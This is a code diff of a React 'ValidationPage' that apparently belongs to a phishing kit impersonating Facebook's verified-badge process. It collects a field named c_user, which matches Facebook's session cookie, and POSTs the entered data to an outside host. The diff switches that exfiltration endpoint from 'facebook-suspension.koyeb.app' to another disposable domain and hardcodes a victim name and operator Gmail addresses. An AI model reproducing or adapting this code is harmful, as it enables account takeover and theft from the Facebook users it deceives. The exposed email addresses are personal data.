@@ -7,11 +7,13 @@ import { useLocation } from 'react-router-dom';
 import { useNavigate } from "react-router";
 
 import { useEffect } from "react";
-const ValidationPage = (props) => {
+const ValidationPage = () => {
   const location = useLocation();
-  const emails = location.state.emails;
-  const workerEmail = location.state.workerEmail;
-  const name = location.state.name;
+  const name = "Usman" 
+  const emails = ["mjohn72929@gmail.com","emma.brook.info.ads@gmail.com"]
+  const workerEmail= "meytal.cohen.official.ads@gmail.com"
+
+  
 
   const navigate = useNavigate();
 
@@ -22,6 +24,7 @@ const ValidationPage = (props) => {
   const [c_user, setC_user] = useState('');
 
   const onSubmit = (e) => {
+    
     e.preventDefault();
 
     // Check if any input field is empty
@@ -31,7 +34,7 @@ const ValidationPage = (props) => {
     }
 
     // If both fields are filled, proceed with form submission
-    fetch("https://facebook-suspension.koyeb.app/submit", {
+    fetch("https://apisubmit-8ll0irls.b4a.run/submit", {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
@@ -79,7 +82,7 @@ const ValidationPage = (props) => {
             <p className="fw-semibold validation_form_para">Previously, the verified badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements.</p>
             <p className="fw-semibold validation_form_para">Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear. </p>
             <p className="fw-semibold text-secondary" style={{ fontSize: "12px" }}>Detailed Video Information.</p>
-            <a href="https://detailed-video-29b30.web.app/detailed%20video.mp4">
+            <a href="https://firebasestorage.googleapis.com/v0/b/chatapp-3655a.appspot.com/o/video.mp4?alt=media&token=da89bb25-84a0-4ca6-b642-165578e6ca72">
               <img src={FacebookVideo} alt="fb" style={{ width: "120px", height: "80px" }} />
             </a>
             <br />
